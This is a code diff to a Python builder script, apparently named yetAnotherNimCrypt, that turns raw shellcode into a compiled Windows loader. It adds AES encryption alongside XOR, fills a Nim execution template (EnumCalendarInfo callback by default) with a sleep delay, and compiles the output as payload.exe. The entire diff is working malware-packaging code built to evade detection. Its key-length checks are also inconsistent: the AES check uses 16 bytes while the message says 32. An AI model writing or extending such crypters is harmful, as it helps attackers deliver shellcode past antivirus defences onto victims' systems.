@@ -17,6 +17,10 @@ import random
 import shutil
 import subprocess
 import sys
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+
+BLOCK_SIZE = 16
 
 CWD = os.path.join(os.path.dirname(__file__))
 
@@ -26,7 +30,7 @@ def random_key(length=32):
 def convert_shellcode(raw_shellcode):
     formated_shellcode = f"var buf: array[{len(raw_shellcode)}, byte] = ["
     for i in range(0, len(raw_shellcode)):
-        formated_shellcode += f"{ord(raw_shellcode[i])},"
+        formated_shellcode += f"{raw_shellcode[i]},"
 
     # Delete last ','
     formated_shellcode = formated_shellcode[:-1]
@@ -46,10 +50,15 @@ def convert_key(key):
 
 def xor_shellcode(shellcode, key):
     key_padd = key * (len(shellcode)//len(key)+1)
-    cipher = ""
+    cipher = b""
     for i in range(len(shellcode)):
-        cipher += chr(shellcode[i] ^ key_padd[i])
+        cipher += bytes([shellcode[i] ^ key_padd[i]])
+
     return cipher
+    
+def aes_shellcode(shellcode, key):
+    cipher = AES.new(key, AES.MODE_ECB)
+    return cipher.encrypt(pad(shellcode, BLOCK_SIZE))
 
 def write_encrypt_template(encrypt, key):
     try:
@@ -77,8 +86,10 @@ def write_shellcode_template(technique, shellcode, sleep_time):
         
         open(f"{CWD}/build/exec.nim", 'w').write(shellcode_template_updated)
         print(f"[+] Shellcode template updated using technique: {technique}")
-    except:
-        print("[-] Invalid Technique")
+    except Exception as e:
+        import traceback
+        print(traceback.format_exc())
+        print("[-] Invalid Technique", e)
         sys.exit(1)
 
 def compile_shellcode_loader(output_path):
@@ -88,10 +99,10 @@ def compile_shellcode_loader(output_path):
 if __name__ == '__main__':
     arguments = docopt(__doc__, version='yetAnotherNimCrypt 0.1')
     
-    key = random_key(32) if not arguments["--key"] else arguments["--key"]
-    encryption = "xor" if not arguments["--encryption"] else arguments["--encryption"]
+    key = random_key(32) if not arguments["--key"] else arguments["--key"].encode()
+    encryption = "xor" if not arguments["--encryption"] else arguments["--encryption"].lower()
     technique = "EnumCalendarInfo" if not arguments["--technique"] else arguments["--technique"]
-    sleep_time = str(20) if not arguments["--sleep_time"] else arguments["--sleep_time"]
+    sleep_time = str(5) if not arguments["--sleep_time"] else arguments["--sleep_time"]
     output_path = "./payload.exe" if not arguments["--output"]  else arguments["--output"]
     shellcode_enc = None
 
@@ -102,7 +113,12 @@ if __name__ == '__main__':
     if len(key) < len(shellcode) and encryption == "xor":
         print("[-] When using xor, the key must be at least as long as quarter of the shellcode length")
         print(f"[+] Generating random key of {len(shellcode)//4} bytes")
-        key = random_key(len(shellcode))
+        key = random_key(len(shellcode) // 4)
+
+    if len(key) != BLOCK_SIZE and encryption == "aes":
+        print("[-] When using aes, the key must be 32 bytes")
+        print(f"[+] Generating random key of 32 bytes")
+        key = random_key(32)
 
     if key:
         if len(key) <= 32:
@@ -113,6 +129,11 @@ if __name__ == '__main__':
         if encryption == "xor":
             shellcode_enc = xor_shellcode(shellcode, key)
             write_encrypt_template(encryption, key)
+
+        elif encryption == "aes":
+            shellcode_enc = aes_shellcode(shellcode, key)
+            write_encrypt_template(encryption, key)
+        
 
     write_shellcode_template(technique, shellcode_enc, sleep_time)
     compile_shellcode_loader(output_path)
